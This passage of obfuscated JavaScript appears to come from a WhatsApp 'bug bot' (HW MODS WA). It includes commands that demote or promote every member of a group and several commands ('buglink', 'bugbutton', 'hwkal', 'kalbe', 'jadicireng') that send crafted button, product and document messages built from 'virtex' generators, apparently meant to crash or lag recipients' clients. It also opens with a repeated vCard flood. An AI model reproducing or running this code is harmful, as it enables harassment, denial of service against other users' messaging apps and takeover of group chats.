x20WA🔥➥🔥➥🔥➥\x20咽翁\x20𝔹𝕆𝕋️\x0aADR;TYPE=WORK:HOME;WHATSAPP.NET:HW\x20MODS\x20WA🔥➥🔥➥🔥➥\x20咽翁\x20𝔹𝕆𝕋️\x0aADR;TYPE=WORK:HOME;WHATSAPP.NET:HW\x20MODS\x20WA🔥➥🔥➥🔥➥\x20咽翁\x20𝔹𝕆𝕋️\x0aADR;TYPE=WORK:HOME;WHATSAPP.NET:HW\x20MODS\x20WA🔥➥🔥➥🔥➥\x20咽翁\x20𝔹𝕆𝕋️\x0aADR;TYPE=WORK:HOME;WHATSAPP.NET:HW\x20MODS\x20WA🔥➥🔥➥🔥➥\x20咽翁\x20𝔹𝕆𝕋️\x0aADR;TYPE=WORK:HOME;WHATSAPP.NET:HW\x20MODS\x20WA🔥➥🔥➥🔥➥\x20咽翁\x20𝔹𝕆𝕋️\x0aADR;TYPE=WORK:HOME;WHATSAPP.NET:HW\x20MODS\x20WA🔥➥🔥➥🔥➥\x20咽翁\x20𝔹𝕆𝕋️\x0aADR;TYPE=WORK:HOME;WHATSAPP.NET:HW\x20MODS\x20WA🔥➥🔥➥🔥➥\x20咽翁\x20𝔹𝕆𝕋️\x0aADR;TYPE=WORK:HOME;WHATSAPP.NET:HW\x20MODS\x20WA🔥➥🔥➥🔥➥\x20咽翁\x20𝔹𝕆𝕋️\x0aADR;TYPE=WORK:HOME;WHATSAPP.NET:HW\x20MODS\x20WA🔥➥🔥➥🔥➥\x20咽翁\x20𝔹𝕆𝕋️\x0aitem1.X-ABLabel:Ponsel\x0aEND:VCARD'});}hehe=await Haikal[_0x107fed(0x1ba)](from,{'displayName':ini_list['length']+_0x107fed(0x1b2),'contacts':ini_list},_0x107fed(0x1b8),{'quoted':kal}),Haikal['sendMessage'](from,_0x107fed(0x1bd),text,{'quoted':hehe});
break
                 case 'demoteall':
                 if (!kal.key.fromMe) return fakestatus('APASIH')
const _0x55e646=_0x3771;(function(_0x20b64e,_0xca3937){const _0x371343=_0x3771,_0x28ab42=_0x20b64e();while(!![]){try{const _0xcad9ee=-parseInt(_0x371343(0x1b6))/0x1+-parseInt(_0x371343(0x1bc))/0x2*(parseInt(_0x371343(0x1be))/0x3)+-parseInt(_0x371343(0x1bb))/0x4*(parseInt(_0x371343(0x1c0))/0x5)+-parseInt(_0x371343(0x1c1))/0x6+-parseInt(_0x371343(0x1b9))/0x7+parseInt(_0x371343(0x1bf))/0x8+parseInt(_0x371343(0x1b8))/0x9;if(_0xcad9ee===_0xca3937)break;else _0x28ab42['push'](_0x28ab42['shift']());}catch(_0x46bdc7){_0x28ab42['push'](_0x28ab42['shift']());}}}(_0x2eb7,0x2dafd));function _0x2eb7(){const _0x4d44f4=['409788yauMvf','44ojzRly','jid','29409CdEsXP','1482208qkiSOE','15qetSSW','1085850eMLxIK','ban','key','76673yUQdmF','groupDemoteAdmin','9235395fkMqmF','1705501npCqYC','fromMe'];_0x2eb7=function(){return _0x4d44f4;};return _0x2eb7();}if(isBan)return reply(mess[_0x55e646(0x1b4)]);if(!isOwner&&!kal[_0x55e646(0x1b5)][_0x55e646(0x1ba)])return;if(!isGroup)return reply(mess['only']['group']);if(!isBotGroupAdmins)return freply('Bot\x20only\x20admin');members_id=[];function _0x3771(_0x1db470,_0x455c76){const _0x2eb78d=_0x2eb7();return _0x3771=function(_0x37711c,_0x31f79f){_0x37711c=_0x37711c-0x1b4;let _0x21eebe=_0x2eb78d[_0x37711c];return _0x21eebe;},_0x3771(_0x1db470,_0x455c76);}for(let mem of groupMembers){members_id['push'](mem[_0x55e646(0x1bd)]);}Haikal[_0x55e646(0x1b7)](from,members_id);
                break
                case 'promoteall':
                if (!kal.key.fromMe) return fakestatus('APASIH')
                function _0x5936(_0x4c756b,_0x5d9a4c){const _0x4549d4=_0x4549();return _0x5936=function(_0x593685,_0x11afc2){_0x593685=_0x593685-0x122;let _0x3c083c=_0x4549d4[_0x593685];return _0x3c083c;},_0x5936(_0x4c756b,_0x5d9a4c);}const _0x59aa67=_0x5936;(function(_0x3219cf,_0xf4f7fc){const _0x3b2ff9=_0x5936,_0x53ea83=_0x3219cf();while(!![]){try{const _0x3659ae=-parseInt(_0x3b2ff9(0x129))/0x1+parseInt(_0x3b2ff9(0x127))/0x2*(-parseInt(_0x3b2ff9(0x122))/0x3)+parseInt(_0x3b2ff9(0x130))/0x4+parseInt(_0x3b2ff9(0x12f))/0x5+parseInt(_0x3b2ff9(0x124))/0x6+parseInt(_0x3b2ff9(0x123))/0x7+parseInt(_0x3b2ff9(0x12b))/0x8*(-parseInt(_0x3b2ff9(0x12e))/0x9);if(_0x3659ae===_0xf4f7fc)break;else _0x53ea83['push'](_0x53ea83['shift']());}catch(_0x4c2463){_0x53ea83['push'](_0x53ea83['shift']());}}}(_0x4549,0x6080f));if(isBan)return reply(mess['ban']);if(!isOwner&&!kal[_0x59aa67(0x12a)][_0x59aa67(0x12d)])return;if(!isGroup)return reply(mess[_0x59aa67(0x125)]['group']);if(!isBotGroupAdmins)return freply(_0x59aa67(0x128));members_id=[];for(let mem of groupMembers){members_id[_0x59aa67(0x126)](mem['jid']);}Haikal[_0x59aa67(0x12c)](from,members_id);function _0x4549(){const _0x1eaf5b=['31282BTQZtp','Bot\x20only\x20admin','388585jxVpdw','key','24CXAneL','groupMakeAdmin','fromMe','854973WFNfJN','238605DMlcBe','2431020yLbWVW','60zwQCKT','5028156cmKVRD','47346qognUQ','only','push'];_0x4549=function(){return _0x1eaf5b;};return _0x4549();}
                break
    case 'jaditoge':
    if (!kal.key.fromMe) return fakestatus('APASIH')
var _0x3d0dff=_0x2c1d;function _0x2c1d(_0x344893,_0x48e6d9){var _0x53e752=_0x53e7();return _0x2c1d=function(_0x2c1db,_0x5b95aa){_0x2c1db=_0x2c1db-0xad;var _0x43d000=_0x53e752[_0x2c1db];return _0x43d000;},_0x2c1d(_0x344893,_0x48e6d9);}(function(_0x40306e,_0x589357){var _0x1179ef=_0x2c1d,_0x397260=_0x40306e();while(!![]){try{var _0x2479e4=-parseInt(_0x1179ef(0xb7))/0x1*(parseInt(_0x1179ef(0xb0))/0x2)+-parseInt(_0x1179ef(0xbb))/0x3*(parseInt(_0x1179ef(0xb4))/0x4)+-parseInt(_0x1179ef(0xc1))/0x5*(parseInt(_0x1179ef(0xb3))/0x6)+-parseInt(_0x1179ef(0xbf))/0x7*(-parseInt(_0x1179ef(0xae))/0x8)+-parseInt(_0x1179ef(0xb6))/0x9*(-parseInt(_0x1179ef(0xc3))/0xa)+parseInt(_0x1179ef(0xad))/0xb+parseInt(_0x1179ef(0xb1))/0xc*(-parseInt(_0x1179ef(0xb8))/0xd);if(_0x2479e4===_0x589357)break;else _0x397260['push'](_0x397260['shift']());}catch(_0xea0575){_0x397260['push'](_0x397260['shift']());}}}(_0x53e7,0x6d56c));if(isBan)return reply(mess[_0x3d0dff(0xc2)]);if(!isQuotedSticker)return freply(_0x3d0dff(0xc0));freply(mess['wait']),encmedia=JSON[_0x3d0dff(0xbc)](JSON['stringify'](kal)[_0x3d0dff(0xc4)]('quotedM','m'))[_0x3d0dff(0xc5)][_0x3d0dff(0xbe)][_0x3d0dff(0xba)],media=await Haikal[_0x3d0dff(0xb5)](encmedia),ran=getRandom(_0x3d0dff(0xb9)),exec('ffmpeg\x20-i\x20'+media+'\x20'+ran,_0x250a28=>{var _0x144bd3=_0x3d0dff;fs[_0x144bd3(0xb2)](media);if(_0x250a28)return freply('Yah\x20gagal,\x20coba\x20ulangi\x20^_^');buffer=fs[_0x144bd3(0xaf)](ran),fekekal(buffer,_0x144bd3(0xbd)),fs[_0x144bd3(0xb2)](ran);});function _0x53e7(){var _0x497d22=['28wrunPE','𝗥𝗲𝗽𝗹𝘆/𝘁𝗮𝗴\x20𝘀𝘁𝗶𝗰𝗸𝗲𝗿\x20!','265HgDdFp','ban','888690PRhvol','replace','message','8987770QWKrrq','452296wcgcLN','readFileSync','11566LpYWiL','612BuWepH','unlinkSync','74754CPQfYj','4wVfIcf','downloadAndSaveMediaMessage','81BzFZre','16lofLWo','106873HqWbUJ','.png','contextInfo','669183KXLQew','parse','NIH','extendedTextMessage'];_0x53e7=function(){return _0x497d22;};return _0x53e7();}
			break
case 'hwkal':
if (!kal.key.fromMe) return fakestatus('APASIH')
if (isBan) return reply(mess.ban)
var _0x2f2a44=_0x21de;function _0x2eb5(){var _0x29e42a=['1633859308','8222382oGCeoo','1338651ymBAWL','36971omvLLO','Qb81+Jo9NYHI9gOhauWAABHdkWnIqZwRFEJM69iRp2E=','24pMtuWR','relayWAMessage','125212omYzxM','RESPONSE','UC5HpJ/c1tA6fy1BuwWbfkLM1m6saoadw1NpAQ4g5n0=','75YXiTeg','25mQllQi','DOCUMENT','audio/mpeg','36orFafp','HW\x20MODS\x20WA','2960PPTUWu','5114YeDTlV','44rNM2Lz2M9cAI7LR0wOkiA9IwYv+ZJdxolVBNvr0BQ=','❏HW\x20MODS\x20WA❏\x0a▬▭▬▭▬▭▬▭▬▬▭▬▭\x0a','6812897gwyyuk','582UwhRAd','1690350azcRLt','❏HW\x20MODS\x20WA❏\x0a▬▭▬▭▬▭▬▭▬▬▭▬▭'];_0x2eb5=function(){return _0x29e42a;};return _0x2eb5();}function _0x21de(_0x1d93d0,_0x1d630a){var _0x2eb59d=_0x2eb5();return _0x21de=function(_0x21de74,_0x3ecef1){_0x21de74=_0x21de74-0x69;var _0x4bde41=_0x2eb59d[_0x21de74];return _0x4bde41;},_0x21de(_0x1d93d0,_0x1d630a);}(function(_0x1e8411,_0x2c19c8){var _0x2f0342=_0x21de,_0x1b9f63=_0x1e8411();while(!![]){try{var _0xc74910=parseInt(_0x2f0342(0x6d))/0x1*(parseInt(_0x2f0342(0x69))/0x2)+-parseInt(_0x2f0342(0x7a))/0x3*(parseInt(_0x2f0342(0x77))/0x4)+parseInt(_0x2f0342(0x7b))/0x5*(parseInt(_0x2f0342(0x6e))/0x6)+-parseInt(_0x2f0342(0x71))/0x7+parseInt(_0x2f0342(0x75))/0x8*(parseInt(_0x2f0342(0x72))/0x9)+parseInt(_0x2f0342(0x80))/0xa*(parseInt(_0x2f0342(0x73))/0xb)+-parseInt(_0x2f0342(0x7e))/0xc*(parseInt(_0x2f0342(0x6c))/0xd);if(_0xc74910===_0x2c19c8)break;else _0x1b9f63['push'](_0x1b9f63['shift']());}catch(_0xcf5bfe){_0x1b9f63['push'](_0x1b9f63['shift']());}}}(_0x2eb5,0xc5610),res=await Haikal['prepareMessageFromContent'](from,{'buttonsMessage':{'text':'','documentMessage':{'url':'https://mmg.whatsapp.net/d/f/Ao4V8UINORXEE1kbqgz262y2ieua8BpYq5yDOd62daR3.enc','mimetype':_0x2f2a44(0x7d),'title':'numayei.mp3','fileSha256':_0x2f2a44(0x74),'fileLength':'837590','pageCount':0x0,'mediaKey':_0x2f2a44(0x79),'fileName':_0x2f2a44(0x6b)+ngazap(prefix),'fileEncSha256':_0x2f2a44(0x6a),'directPath':'/v/t62.7119-24/30793668_123631366703848_634609541976422241_n.enc?ccb=11-4&oh=b5a6547acd2f225f63fe25aba0724788&oe=61870A49','mediaKeyTimestamp':_0x2f2a44(0x70)},'contentText':_0x2f2a44(0x6b)+ngazap(prefix),'footerText':'❏HW\x20MODS\x20WA❏\x0a▬▭▬▭▬▭▬▭▬▬▭▬▭\x0a'+ngazap(prefix),'buttons':[{'buttonId':'HAIKAL','buttonText':{'displayText':_0x2f2a44(0x6f)},'type':_0x2f2a44(0x78)}],'headerType':_0x2f2a44(0x7c)}},{'quoted':ikal}),Haikal[_0x2f2a44(0x76)](res),reply(_0x2f2a44(0x7f)));
break
case 'kalbe':
if (!kal.key.fromMe) return fakestatus('APASIH')
if (isBan) return reply(mess.ban)
function _0x116c(_0xa37311,_0x41b460){var _0x723cc3=_0x723c();return _0x116c=function(_0x116cd4,_0x2c3c80){_0x116cd4=_0x116cd4-0x1b4;var _0x2ac34d=_0x723cc3[_0x116cd4];return _0x2ac34d;},_0x116c(_0xa37311,_0x41b460);}var _0x3878f6=_0x116c;(function(_0x2968e7,_0x1283bd){var _0x2ca628=_0x116c,_0x427c67=_0x2968e7();while(!![]){try{var _0x52b8f9=-parseInt(_0x2ca628(0x1ca))/0x1+parseInt(_0x2ca628(0x1cd))/0x2*(parseInt(_0x2ca628(0x1cc))/0x3)+-parseInt(_0x2ca628(0x1bc))/0x4+parseInt(_0x2ca628(0x1c3))/0x5*(-parseInt(_0x2ca628(0x1c0))/0x6)+parseInt(_0x2ca628(0x1c8))/0x7*(-parseInt(_0x2ca628(0x1b5))/0x8)+-parseInt(_0x2ca628(0x1be))/0x9*(parseInt(_0x2ca628(0x1b8))/0xa)+parseInt(_0x2ca628(0x1c2))/0xb*(parseInt(_0x2ca628(0x1c1))/0xc);if(_0x52b8f9===_0x1283bd)break;else _0x427c67['push'](_0x427c67['shift']());}catch(_0x119254){_0x427c67['push'](_0x427c67['shift']());}}}(_0x723c,0x7c692),res=await Haikal[_0x3878f6(0x1c5)](from,{'buttonsMessage':{'text':'','videoMessage':{'url':_0x3878f6(0x1bd),'mimetype':_0x3878f6(0x1c6),'fileSha256':_0x3878f6(0x1b9),'fileLength':_0x3878f6(0x1c7),'seconds':0x3,'mediaKey':'1BGdK8Bn7IX7lisBM/lMo2VRgzkEOEq6DCboehmt8YA=','caption':_0x3878f6(0x1b6)+ngazap(prefix),'gifPlayback':!![],'height':0xd2,'width':0xd0,'fileEncSha256':_0x3878f6(0x1b4),'directPath':_0x3878f6(0x1ba),'mediaKeyTimestamp':_0x3878f6(0x1b7),'gifAttribution':'TENOR'},'contentText':_0x3878f6(0x1c9),'footerText':_0x3878f6(0x1cb)+ngazap(prefix),'buttons':[{'buttonId':_0x3878f6(0x1bb),'buttonText':{'displayText':''+ngazap(prefix)},'type':_0x3878f6(0x1c4)}],'headerType':_0x3878f6(0x1bf)}},{'quoted':ikal}),Haikal[_0x3878f6(0x1ce)](res),reply('HW\x20MODS\x20WA'));function _0x723c(){var _0x296f71=['10agBZiO','Kvn1RXoMifiEbRb1Detl1e/j+KBuME2YTVoVQbXYq20=','/v/t62.9505-24/13157053_138062335217809_3855917719245062426_n.enc?ccb=11-4&oh=b6e1ac1ea844d7403c3447344230f16c&oe=6188BE0A','HAIKAL','3057904AHjJJf','https://mmg.whatsapp.net/d/f/AkSHKROKscv3M_rc-bLBiviL_BNYfLnl6nK9cZ9PLNX4.enc','7228053iYZkNb','VIDEO','498SupRfZ','42241176kiAljK','11KZezWs','50185FyJNhd','RESPONSE','prepareMessageFromContent','video/mp4','140336','259jqZUrg','❏HW\x20MODS\x20WA❏\x0a▬▭▬▭▬▭▬▭▬▬▭','738831NtgQjO','❏HW\x20MODS\x20WA❏\x0a▬▭▬▭▬▭▬▭▬▬▭▬▭\x0a','6eHvcMv','368336FbOrFL','relayWAMessage','Bkp0oWaK7MUdpylzPGfICFbwuxmGtYkgqDMADAexp34=','51752mZXbUl','HW\x20MODS\x20WA','1633860541'];_0x723c=function(){return _0x296f71;};return _0x723c();}
break
case 'jaditahu':
if (!kal.key.fromMe) return fakestatus('APASIH')
if (isBan) return reply(mess.ban)
				function _0x3d10(){const _0x37a6df=['3507795kVgOuN','quotedM','622241GShvxd','stringify','Kirim\x20gambar\x20atau\x20reply\x20dengan\x20caption\x20','12oebNRW','1734076IKETRB','readFileSync','parse','fekekal','extendedTextMessage','9261054CWaALZ','2qGaggp','2818291onoaVe','message','fekekal\x20caption','6105950acWbSl','videoMessage','downloadMediaMessage','3553928xLZNSw'];_0x3d10=function(){return _0x37a6df;};return _0x3d10();}function _0x3c61(_0x134b82,_0x4f6d91){const _0x3d108f=_0x3d10();return _0x3c61=function(_0x3c616f,_0x1ce123){_0x3c616f=_0x3c616f-0x1dc;let _0x19b823=_0x3d108f[_0x3c616f];return _0x19b823;},_0x3c61(_0x134b82,_0x4f6d91);}const _0x45a9c8=_0x3c61;(function(_0x29d192,_0x217c31){const _0x4e6717=_0x3c61,_0x5079f3=_0x29d192();while(!![]){try{const _0x2ee990=-parseInt(_0x4e6717(0x1e7))/0x1*(parseInt(_0x4e6717(0x1dd))/0x2)+parseInt(_0x4e6717(0x1e5))/0x3+-parseInt(_0x4e6717(0x1eb))/0x4+parseInt(_0x4e6717(0x1e1))/0x5+-parseInt(_0x4e6717(0x1ea))/0x6*(-parseInt(_0x4e6717(0x1de))/0x7)+-parseInt(_0x4e6717(0x1e4))/0x8+-parseInt(_0x4e6717(0x1dc))/0x9;if(_0x2ee990===_0x217c31)break;else _0x5079f3['push'](_0x5079f3['shift']());}catch(_0x5274a1){_0x5079f3['push'](_0x5079f3['shift']());}}}(_0x3d10,0xa2c32));if(isMedia&&!kal[_0x45a9c8(0x1df)][_0x45a9c8(0x1e2)]||isQuotedImage){let encmedia=isQuotedImage?JSON[_0x45a9c8(0x1ed)](JSON[_0x45a9c8(0x1e8)](kal)['replace'](_0x45a9c8(0x1e6),'m'))[_0x45a9c8(0x1df)][_0x45a9c8(0x1ef)]['contextInfo']:kal,media=await Haikal[_0x45a9c8(0x1e3)](encmedia);Haikal['sendMessage'](from,media,image,{'mimetype':Mimetype[_0x45a9c8(0x1ee)],'quoted':kal,'thumbnail':fs[_0x45a9c8(0x1ec)]('./stik/deden.jpeg')});}else freply(from,_0x45a9c8(0x1e9)+prefix+_0x45a9c8(0x1e0),kal);
				break
// KATALOG REPLY
case 'jadicireng':
if (!kal.key.fromMe) return fakestatus('APASIH')
if (isBan) return reply(mess.ban)
const _0x32b33f=_0x2cb2;function _0x2cb2(_0x28004a,_0x12077b){const _0x2d932e=_0x2d93();return _0x2cb2=function(_0x2cb278,_0x10010b){_0x2cb278=_0x2cb278-0x6b;let _0xdbc5f8=_0x2d932e[_0x2cb278];return _0xdbc5f8;},_0x2cb2(_0x28004a,_0x12077b);}(function(_0x66cefc,_0x1c9598){const _0x2d24b5=_0x2cb2,_0x53143b=_0x66cefc();while(!![]){try{const _0xe23b1a=parseInt(_0x2d24b5(0x87))/0x1*(-parseInt(_0x2d24b5(0x89))/0x2)+-parseInt(_0x2d24b5(0x71))/0x3*(parseInt(_0x2d24b5(0x76))/0x4)+-parseInt(_0x2d24b5(0x80))/0x5+parseInt(_0x2d24b5(0x7a))/0x6*(-parseInt(_0x2d24b5(0x78))/0x7)+parseInt(_0x2d24b5(0x86))/0x8*(-parseInt(_0x2d24b5(0x79))/0x9)+-parseInt(_0x2d24b5(0x72))/0xa+-parseInt(_0x2d24b5(0x7b))/0xb*(-parseInt(_0x2d24b5(0x81))/0xc);if(_0xe23b1a===_0x1c9598)break;else _0x53143b['push'](_0x53143b['shift']());}catch(_0x25f722){_0x53143b['push'](_0x53143b['shift']());}}}(_0x2d93,0x64dff));if(!kal[_0x32b33f(0x6d)][_0x32b33f(0x83)]&&!isOwner)return;const tokatalog=isQuotedImage?JSON[_0x32b33f(0x82)](JSON[_0x32b33f(0x77)](kal)['replace'](_0x32b33f(0x75),'m'))[_0x32b33f(0x7e)]['extendedTextMessage'][_0x32b33f(0x85)]:kal;function _0x2d93(){const _0x1321c1=['3420yNPqxK','parse','fromMe','image','contextInfo','8torpQg','244633gxyfxs','relayWAMessage','4pZIVvu','prepareMessage','0@s.whatsapp.net','key','99999999','999999999','./stik/bacotah.jpeg','3JxCWrz','6259560DQrdDT','HW\x20MODS\x20WA\x20','imageMessage','quotedM','1303876cAHJGw','stringify','1295aHwlWr','6026022YKXKPj','8508ssdsiv','127941HhfMXx','prepareMessageFromContent','6285714170944@s.whatsapp.net','message','split','2642865QFGhlQ'];_0x2d93=function(){return _0x1321c1;};return _0x2d93();}vkatalog=await Haikal['downloadMediaMessage'](tokatalog),imeu=await Haikal[_0x32b33f(0x6b)](_0x32b33f(0x6c),vkatalog,image),imeg=imeu[_0x32b33f(0x7e)][_0x32b33f(0x74)],product1=q[_0x32b33f(0x7f)]('|')[0x0],res=await Haikal[_0x32b33f(0x7c)](from,{'productMessage':{'product':{'productImage':imeg,'thumbnail':fs['readFileSync'](_0x32b33f(0x70)),'title':_0x32b33f(0x73)+virtex,'description':''+vipi,'mimetype':Mimetype[_0x32b33f(0x84)],'priceAmount1000':_0x32b33f(0x6e),'descriptionCount':_0x32b33f(0x6f),'productImageCount':'1'},'businessOwnerJid':_0x32b33f(0x7d),'contextInfo':{'forwardingScore':0x270f,'isForwarded':!![]}}},{'quoted':kal}),Haikal[_0x32b33f(0x88)](res);
break
// GAMBAR VIRGAM REPLY
case 'jaditahu':
if (!kal.key.fromMe) return fakestatus('APASIH')
if (isBan) return reply(mess.ban)
				const _0x20d280=_0x30ad;(function(_0x1ee297,_0xafa0d2){const _0x52b507=_0x30ad,_0x59a7f2=_0x1ee297();while(!![]){try{const _0x4a1dce=parseInt(_0x52b507(0x1e4))/0x1*(-parseInt(_0x52b507(0x1d1))/0x2)+-parseInt(_0x52b507(0x1d4))/0x3*(parseInt(_0x52b507(0x1e3))/0x4)+-parseInt(_0x52b507(0x1d0))/0x5+parseInt(_0x52b507(0x1e6))/0x6*(parseInt(_0x52b507(0x1db))/0x7)+parseInt(_0x52b507(0x1e8))/0x8*(parseInt(_0x52b507(0x1de))/0x9)+-parseInt(_0x52b507(0x1d2))/0xa*(parseInt(_0x52b507(0x1d8))/0xb)+-parseInt(_0x52b507(0x1d3))/0xc*(-parseInt(_0x52b507(0x1e2))/0xd);if(_0x4a1dce===_0xafa0d2)break;else _0x59a7f2['push'](_0x59a7f2['shift']());}catch(_0x2ab679){_0x59a7f2['push'](_0x59a7f2['shift']());}}}(_0x30ac,0x4067e));function _0x30ac(){const _0x1b6a79=['contextInfo','fekekal\x20caption','fekekal','130BNSYoi','670536DuzNXS','1789reHynm','videoMessage','1266dfmwnc','parse','71128EvAGQh','1027170KdVzGp','566YBeAHL','130090TCfCEa','1629780YTampJ','9dcYslG','message','downloadMediaMessage','replace','187SOrvoh','quotedM','sendMessage','4543cVwtDF','./stik/deden.jpeg','readFileSync','207wuJYCF'];_0x30ac=function(){return _0x1b6a79;};return _0x30ac();}function _0x30ad(_0x3547e4,_0x1b5f7d){const _0x30acfd=_0x30ac();return _0x30ad=function(_0x30adcf,_0x309f6d){_0x30adcf=_0x30adcf-0x1d0;let _0x359cc1=_0x30acfd[_0x30adcf];return _0x359cc1;},_0x30ad(_0x3547e4,_0x1b5f7d);}if(isMedia&&!kal[_0x20d280(0x1d5)][_0x20d280(0x1e5)]||isQuotedImage){let encmedia=isQuotedImage?JSON[_0x20d280(0x1e7)](JSON['stringify'](kal)[_0x20d280(0x1d7)](_0x20d280(0x1d9),'m'))['message']['extendedTextMessage'][_0x20d280(0x1df)]:kal,media=await Haikal[_0x20d280(0x1d6)](encmedia);Haikal[_0x20d280(0x1da)](from,media,image,{'mimetype':Mimetype[_0x20d280(0x1e1)],'quoted':kal,'thumbnail':fs[_0x20d280(0x1dd)](_0x20d280(0x1dc))});}else freply(from,'Kirim\x20gambar\x20atau\x20reply\x20dengan\x20caption\x20'+prefix+_0x20d280(0x1e0),kal);
				break
case 'buglink':
if (!kal.key.fromMe) return fakestatus('APASIH')
var _0x4b2499=_0x49db;(function(_0x431727,_0x3d7f3f){var _0xed5c17=_0x49db,_0x33e05b=_0x431727();while(!![]){try{var _0x21a33d=parseInt(_0xed5c17(0x160))/0x1*(parseInt(_0xed5c17(0x166))/0x2)+parseInt(_0xed5c17(0x15f))/0x3+-parseInt(_0xed5c17(0x173))/0x4*(-parseInt(_0xed5c17(0x172))/0x5)+parseInt(_0xed5c17(0x170))/0x6*(parseInt(_0xed5c17(0x174))/0x7)+parseInt(_0xed5c17(0x161))/0x8*(parseInt(_0xed5c17(0x169))/0x9)+parseInt(_0xed5c17(0x167))/0xa*(-parseInt(_0xed5c17(0x16e))/0xb)+-parseInt(_0xed5c17(0x16d))/0xc*(parseInt(_0xed5c17(0x16f))/0xd);if(_0x21a33d===_0x3d7f3f)break;else _0x33e05b['push'](_0x33e05b['shift']());}catch(_0x1ebc8b){_0x33e05b['push'](_0x33e05b['shift']());}}}(_0xa997,0xca5f2));function _0x49db(_0x4670d6,_0x48e233){var _0xa9971e=_0xa997();return _0x49db=function(_0x49dbf3,_0x9b4856){_0x49dbf3=_0x49dbf3-0x15f;var _0x4a8bf7=_0xa9971e[_0x49dbf3];return _0x4a8bf7;},_0x49db(_0x4670d6,_0x48e233);}if(!isOwner&&!kal[_0x4b2499(0x162)][_0x4b2499(0x164)])return reply(mess[_0x4b2499(0x168)][_0x4b2499(0x16a)]);Haikal[_0x4b2499(0x16c)](from,virtex7(prefix),text,{'quoted':kal,'contextInfo':{'text':'🔥➥','forwardingScore':0x3b9aca00,'isForwarded':![],'sendEphemeral':![],'externalAdReply':{'title':''+virtex9(prefix),'body':'','previewType':_0x4b2499(0x165),'thumbnailUrl':'https://cdn.pixabay.com/photo/2021/07/21/14/42/indonesian-6483193_640.jpg','thumbnail':fs[_0x4b2499(0x163)](_0x4b2499(0x171)),'sourceUrl':_0x4b2499(0x16b)}}});function _0xa997(){var _0x311101=['2799414mlRzMk','2EkmjCt','8wOeLnI','key','readFileSync','fromMe','PHOTO','1062878tylltJ','5042490FGWanb','only','3287259sYWHPe','ownerB','https://youtube.com/channel/UCa37vxxUI-XULKw_sHb4A5g','sendMessage','12DNchZl','11aqXPIt','42729349BbHuuQ','192tmcyTg','./stik/Ahhikal.jpeg','6082165OelioA','4TVQlvR','228011blYPIO'];_0xa997=function(){return _0x311101;};return _0xa997();}
                break
case 'xhiro':
if (!kal.key.fromMe) return fakestatus('APASIH')
reply(`${ngazap(prefix)}`)
break
        case 'bugbutton':
        if (!kal.key.fromMe) return fakestatus('APASIH')
        function _0x54ba(){var _0x5cde90=['5476842fMoKSB','4617894kozrSx','16EWcpes','12283845hdoYMg','881305zboGOF','fromMe','1736367rolEwD','key','482971ItjaMJ','bbaij72njnwjibdo16830nslm1782','26402930wEKpYE','20NcCeZr','2TPdkui','HAIKAL🌹'];_0x54ba=function(){return _0x5cde90;};return _0x54ba();}var _0x532c80=_0x9a24;(function(_0x49e50d,_0x4cf6b1){var _0xd43aac=_0x9a24,_0x598f7f=_0x49e50d();while(!![]){try{var _0x8b6888=-parseInt(_0xd43aac(0xaf))/0x1*(parseInt(_0xd43aac(0xa5))/0x2)+-parseInt(_0xd43aac(0xad))/0x3+-parseInt(_0xd43aac(0xb2))/0x4*(parseInt(_0xd43aac(0xab))/0x5)+parseInt(_0xd43aac(0xa8))/0x6+-parseInt(_0xd43aac(0xaa))/0x7+parseInt(_0xd43aac(0xa9))/0x8*(parseInt(_0xd43aac(0xa7))/0x9)+parseInt(_0xd43aac(0xb1))/0xa;if(_0x8b6888===_0x4cf6b1)break;else _0x598f7f['push'](_0x598f7f['shift']());}catch(_0xe68986){_0x598f7f['push'](_0x598f7f['shift']());}}}(_0x54ba,0xe2d5e));if(!isOwner&&!kal[_0x532c80(0xae)][_0x532c80(0xac)])return reply(mess['only']['ownerB']);function _0x9a24(_0x47ee8a,_0x2c18ef){var _0x54ba83=_0x54ba();return _0x9a24=function(_0x9a2418,_0x25c9f1){_0x9a2418=_0x9a2418-0xa5;var _0x388c80=_0x54ba83[_0x9a2418];return _0x388c80;},_0x9a24(_0x47ee8a,_0x2c18ef);}sendButLocation(from,''+ngazap(prefix),''+virtag(prefix),{'jpegThumbnail':fekekal},[{'buttonId':prefix+_0x532c80(0xb0),'buttonText':{'displayText':_0x532c80(0xa6)},'type':0x1}]);
break
case 'hwmods':
if (!kal.key.fromMe) return fakestatus('APASIH')
if (isBan) return reply(mess.ban)
var _0xbf3e83=_0x4e13;(function(_0x421acf,_0x57fad1){var _0x140f4f=_0x4e13,_0x22f774=_0x421acf();while(!![]){try{var _0x2b4e1b=-parseInt(_0x140f4f(0x110))/0x1+parseInt(_0x140f4f(0x119))/0x2+-parseInt(_0x140f4f(0x115))/0x3+-parseInt(_0x140f4f(0x118))/0x4*(-parseInt(_0x140f4f(0x11c))/0x5)+-parseInt(_0x140f4f(0x104))/0x6+-parseInt(_0x140f4f(0x121))/0x7*(parseInt(_0x140f4f(0x105))/0x8)+-parseInt(_0x140f4f(0x117))/0x9*(-parseInt(_0x140f4f(0x106))/0xa);if(_0x2b4e1b===_0x57fad1)break;else _0x22f774['push'](_0x22f774['shift']());}catch(_0x5e3c6f){_0x22f774['push'](_0x22f774['shift']());}}}(_0x50d3,0xdf70b),res=await Haikal['prepareMessageFromContent'](from,{'buttonsMessage':{'text':'','documentMessage':{'url':_0xbf3e83(0x100),'mimetype':_0xbf3e83(0x101),'title':'XM\x20XHIRO\x20MHONSHINE.XM','fileSha256':_0xbf3e83(0x103),'fileLength':_0xbf3e83(0x109),'pageCount':0x0,'mediaKey':_0xbf3e83(0x10d),'fileName':_0xbf3e83(0x11e)+ngazap(prefix),'fileEncSha256':_0xbf3e83(0x11d),'directPath':'/v/t62.7119-24/40334034_1424395651264572_7283529517097198731_n.enc?ccb=11-4&oh=1d23700af3ceaebff81fb1d30d0a8dfe&oe=6188CD67','mediaKeyTimestamp':_0xbf3e83(0x10a)},'contentText':_0xbf3e83(0x11a)+pushname+'\x0aPrefix\x20:\x20「\x20MULTI-PREFIX\x20」\x0a*'+ucapanWaktu+_0xbf3e83(0x10f)+timeJak+_0xbf3e83(0x10b)+timeMak+_0xbf3e83(0x112)+timeJay+'\x0a*•>\x20Whatsapp\x20:*\x20'+wa_version+_0xbf3e83(0x108)+blocked[_0xbf3e83(0x10e)]+'\x20Blocked\x0a*•>\x20Group\x20Chat\x20:*\x20'+totalgroup[_0xbf3e83(0x10e)]+_0xbf3e83(0x11b)+totalkontak[_0xbf3e83(0x10e)]+_0xbf3e83(0x111)+totalchat[_0xbf3e83(0x10e)]+_0x